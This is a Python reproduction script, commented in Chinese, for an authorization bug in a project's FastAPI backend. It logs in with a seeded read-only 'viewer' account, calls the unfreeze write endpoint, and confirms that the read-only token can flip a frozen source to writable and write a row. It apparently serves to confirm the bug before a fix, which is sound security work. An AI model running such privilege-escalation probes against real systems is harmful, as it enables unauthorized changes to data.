"""越权复现脚本：持只读令牌(viewer)直接打解冻写库接口。

用法（仓库根目录，隔离模式）：
    python -I scripts/repro_viewer_unfreeze.py

预期（修复前）：HTTP 200，冻结源 output_mode 被只读令牌改成「可写」，
catchups 正式侧被写入一行 —— 越权写库复现成功。
"""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "backend"))

from fastapi.testclient import TestClient  # noqa: E402

import app as app_module  # noqa: E402
from app import app as fastapi_app, init_db  # noqa: E402


def main() -> int:
    tmp = Path(tempfile.mkdtemp()) / "repro.db"
    app_module.DB_PATH = tmp
    app_module.SESSIONS.clear()
    init_db()

    c = TestClient(fastapi_app)

    # 1) 只读账号登录，拿只读令牌
    login = c.post("/api/login", json={"username": "viewer", "password": "view123"})
    assert login.status_code == 200, login.text
    role = login.json()["role"]
    viewer_token = login.json()["token"]
    h = {"Authorization": f"Bearer {viewer_token}"}
    print(f"[1] 只读令牌已签发: viewer / 角色={role}")

    # 2) 复现前确认物流源处于冻结态
    before = c.get("/api/sources", headers=h).json()["items"]
    frozen = [s for s in before if s["name"] == "物流源"][0]
    print(f"[2] 解冻前 物流源.output_mode = {frozen['output_mode']}")
    catchups_before = len(c.get("/api/catchups", headers=h).json()["items"])

    # 3) 只读令牌直接打解冻写库
    r = c.post("/api/catchup/物流源", headers=h)
    print(f"[3] POST /api/catchup/物流源 (只读令牌) -> HTTP {r.status_code} {r.text.strip()}")

    after = c.get("/api/sources", headers=h).json()["items"]
    mode_after = [s for s in after if s["name"] == "物流源"][0]["output_mode"]
    catchups_after = len(c.get("/api/catchups", headers=h).json()["items"])
    print(f"[4] 解冻后 物流源.output_mode = {mode_after}")
    print(f"[5] catchups 正式侧行数: {catchups_before} -> {catchups_after}")

    exploited = r.status_code == 200 and mode_after == "可写" and catchups_after > catchups_before
    if exploited:
        print("[结论] 越权写库复现成功：只读令牌打通解冻写路径，正式侧被写入。")
        return 0
    print("[结论] 未复现越权写库（接口已拦截或未改输出态）。")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
